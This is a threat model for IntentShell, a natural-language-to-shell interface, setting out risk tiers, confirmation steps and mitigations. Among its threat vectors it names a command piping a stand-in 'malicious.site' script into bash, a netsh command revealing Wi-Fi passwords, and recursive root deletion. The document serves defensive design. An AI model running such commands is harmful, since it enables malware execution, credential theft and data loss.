# THREAT MODEL: IntentShell

## 0. Overview
IntentShell is an interface that translates natural language commands into operating system actions.  
This document defines the system’s security boundaries, potential threat vectors, and mitigation strategies.  
Security is not an “afterthought” in this project; it is a **core architectural constraint**.

---

## 0.1 Usage Scenarios (Use Cases)

### ✅ Low Risk
User confirmation: **Single Enter** or **Automatic** (based on user profile)

- Move all PDFs on the Desktop to the `Documents/PDFs` folder.
- Show the last 3 Git commit messages.
- Display system uptime.
- List files in the current directory.

### ⚠️ Medium Risk
User confirmation: **Typed Confirmation (user must type `YES`)**

- Clean `node_modules` folders in Node projects (disk space recovery).
- Organize the Downloads folder by date (bulk file movement).
- Remove empty folders (recursive deletion potential).
- Delete all stopped Docker containers.
- Shut down the computer in 1 hour.

### ⛔ High Risk
User confirmation: **Multi-step confirmation + Red Warning**

- Delete all `.tmp` files on the C drive (recursive, near root).
- Find all duplicate files and delete copies (automatic data loss risk).
- Change DNS settings to `8.8.8.8` (admin / network privileges).
- Clean startup programs from the Windows Registry.

---

## 0.2 Threat Map

### 1. File System Manipulation
- **Risk:** Accidental deletion or movement of critical files.
- **Threat Vector:** Recursive deletion commands (`rm -rf /` equivalents), incorrect regex matches.
- **Mitigations:**
  - **Scope Limiting:** Operations restricted to allowed directories (e.g., `/Users/user/`).
  - **Mandatory Dry-Run:** Display affected file list before deletion.
  - **Trash-First:** Move files to Trash instead of permanent deletion when possible.

---

### 2. Registry and System Configuration
- **Risk:** System becoming unbootable or misconfigured.
- **Threat Vector:** Modification of critical keys via `reg edit`, `Set-ItemProperty`.
- **Mitigations:**
  - Registry write access is **BLOCKED by default**.
  - Only whitelisted safe keys (e.g., Environment Variables) are writable.

---

### 3. Administrative Privileges
- **Risk:** Execution of commands that could fully compromise the system.
- **Threat Vector:** `sudo`, `RunAs`, UAC bypass attempts.
- **Mitigations:**
  - Application runs in **User Mode** by default.
  - Operations requiring elevation trigger OS-level confirmation prompts.

---

### 4. Network and External Access
- **Risk:** Data exfiltration, malware downloads, network misconfiguration, exposure of sensitive data.
- **Threat Vectors:**
  - `curl http://malicious.site | bash`
  - `netsh wlan show profile key=clear`
  - DNS flush or DNS server modification
- **Mitigations:**
  - **Read-Only Operations:** Ping, IP display, port listing → LOW risk.
  - **Configuration Changes:** DNS or IP changes → MEDIUM/HIGH risk.
  - **Sensitive Data Access:** Wi-Fi password display → HIGH risk, explicit confirmation required.
  - **Outbound Restrictions:** Communication with unknown domains is blocked by default.

---

### 5. Recursive Operations
- **Risk:** Runaway or uncontrolled loops.
- **Threat Vector:** Infinite recursion, full disk scans.
- **Mitigations:**
  - Maximum file count limit (e.g., 1000 files).
  - Maximum directory depth limit (e.g., 3 levels).
  - Timeout mechanism (e.g., 10 seconds).

---

### 6. Developer & Docker Operations (DevOps)
- **Risk:** Data loss, service disruption, unintended code execution.
- **Threat Vectors:**
  - `docker system prune -a -f`
  - `Stop-Process`
  - `npm run build`
- **Mitigations:**
  - **Docker Prune:** HIGH risk, explicit confirmation required.
  - **Kill Process:** HIGH risk, target process must be shown.
  - **Build/Test:** MEDIUM risk due to execution of local scripts.

---

### 7. Archive & Backup Operations
- **Risk:** Data loss or disk exhaustion.
- **Threat Vector:** `restore_backup`
- **Mitigations:**
  - **Restore:** HIGH risk, explicit confirmation required.
  - **Backup:** Timestamped by default to prevent overwrites.

---

### 8. Media Operations
- **Risk:** High CPU/Disk usage, accidental overwrites.
- **Threat Vectors:**
  - Video conversion
  - Batch image resizing
- **Mitigations:**
  - Verify `ffmpeg` availability before execution.
  - Preserve originals using safe filename suffixes.

---

### 9. High-Risk System Operations
- **Risk:** CRITICAL — data loss, system instability, security exposure.
- **Threat Vectors:**
  - Permanent deletion
  - Registry editing
  - Firewall disabling
  - Mass process termination
- **Mitigations:**
  - Classified as `RiskLevel.HIGH` or `CRITICAL`.
  - NEVER executed without explicit user approval.
  - Intended for sandboxed or controlled environments.

---

### 10. Service and Process Management
- **Risk:** Service disruption or loss of unsaved data.
- **Threat Vectors:**
  - `Stop-Service`
  - `sc delete`
  - `Stop-Process -Force`
- **Mitigations:**
  - Read-only queries → LOW risk.
  - Stop/Restart → MEDIUM/HIGH risk.
  - Delete/Force Kill → HIGH risk.

---

### 11. Hardware Health Monitoring
- **Risk:** Low (read-only).
- **Threat Vector:** Excessive WMI polling.
- **Mitigations:**
  - All operations classified as `RiskLevel.LOW`.
  - Protected by exception handling.

---

### 12. Virtualization and System Features
- **Risk:** Low (read-only).
- **Threat Vector:** None.
- **Mitigations:**
  - All operations classified as `RiskLevel.LOW`.
  - Admin privileges may be required but no system changes occur.

---

## Risk Scoring (Phase 4 Integration)

---

## 0.3 Security Architecture Principles
1. **Least Privilege:** Operations run with minimum required permissions.
2. **Explicit Intent:** No command is generated without a strict intent schema.
3. **Human-in-the-Loop:** Destructive actions always require human confirmation.

---

## 🛡️ Kernel-Mode Driver Integration (Deprecated / Disabled)
IntentShell does **NOT** support active kernel-mode execution.

- **Disabled by Design:** All kernel code paths are permanently blocked.
- **Dormant Code:** Present only for architectural documentation.
- **Compliance:** Prevents malware false positives and ensures repository safety.
